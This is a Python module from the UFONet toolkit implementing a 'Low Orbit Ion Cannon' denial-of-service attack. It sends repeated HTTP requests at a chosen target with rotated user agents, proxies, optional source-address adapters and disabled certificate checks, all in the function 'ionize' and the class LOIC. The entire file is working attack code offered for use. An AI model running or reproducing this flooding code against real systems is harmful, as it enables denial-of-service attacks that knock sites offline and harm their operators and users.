#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random
from core.mods.mod_config import LOIC_SPEED
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning # black magic
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    from urllib3.util.retry import Retry
    from urllib3.util import Timeout
except:
    print("\nError importing: requests lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-requests'\n")
    sys.exit(2)

# UFONet DoS Web LOIC (Low Orbit Ion Cannon)
def ionize(self, target, rounds, proxy, address_dict):
    n=0
    try:
        proxyD = { 
              "http"  : proxy, 
            }
        for i in range(0, int(rounds)):
            n=n+1
            self.user_agent = random.choice(self.agents).strip()
            headers = {'User-Agent': str(self.user_agent), 'Connection': 'close'}
            s = requests.Session()
            timeout = Timeout(connect=0.1, read=0.5)
            if address_dict['source'] is not None: # Allow changed source for sending request
                from requests_toolbelt.adapters import source
                retry = Retry(connect=3, backoff_factor=0)
                new_source = source.SourceAddressAdapter(source_address = address_dict['source'], max_retries=retry)

            s.mount("http://", new_source)
            s.mount("https://", new_source)
            # TODO: Reuse the connection ports
            try:
                r = s.get(target, headers=headers, proxies=proxyD, verify=False, timeout=timeout)
                # print("[Info] [AI] [LOIC] Firing 'pulse' ["+str(n)+"] -> [HIT!]")
            except Exception as ie:
                print("[Error] [AI] LOIC: Failed to engage with 'pulse' ["+str(n)+"], {}".format(ie))
            # n=n+1
            # self.user_agent = random.choice(self.agents).strip()
            # headers = {'User-Agent': str(self.user_agent)}

            # if address_dict['source'] is not None: # Allow different source for sending request
            #     from requests_toolbelt.adapters import source
            #     s = requests.Session()
            #     retry = Retry(connect=3, backoff_factor=0.5)
            #     new_source = source.SourceAddressAdapter(source_address = address_dict['source'], max_retries=retry)
            #     s.mount("http://", new_source)
            #     s.mount("https://", new_source)

            # try:
            #     r = requests.get(target, headers=headers, proxies=proxyD, verify=False)
            #     # print("[Info] [AI] [LOIC] Firing 'pulse' ["+str(n)+"] -> [HIT!]")
            # except Exception as ie:
            #     print("[Error] [AI] LOIC: Failed to engage with 'pulse' ["+str(n)+"], {}".format(ie))
    except Exception as e:
        print("[Error] [AI] [LOIC] Failing to engage... -> "
        "Is still target online? -> [Checking!], exception encountered: {}".format(e))

class LOIC(object):
    def __init__(self):
        self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
        self.agents = []
        f = open(self.agents_file)
        agents = f.readlines()
        f.close()
        for agent in agents:
            self.agents.append(agent)

    def attacking(self, target, rounds, proxy, address_dict):
        print("[Info] [AI] Low Orbit Ion Cannon (LOIC) is ready to fire: [" , rounds, "pulses ]")
        ionize(self, target, rounds, proxy, address_dict) # attack with LOIC using threading
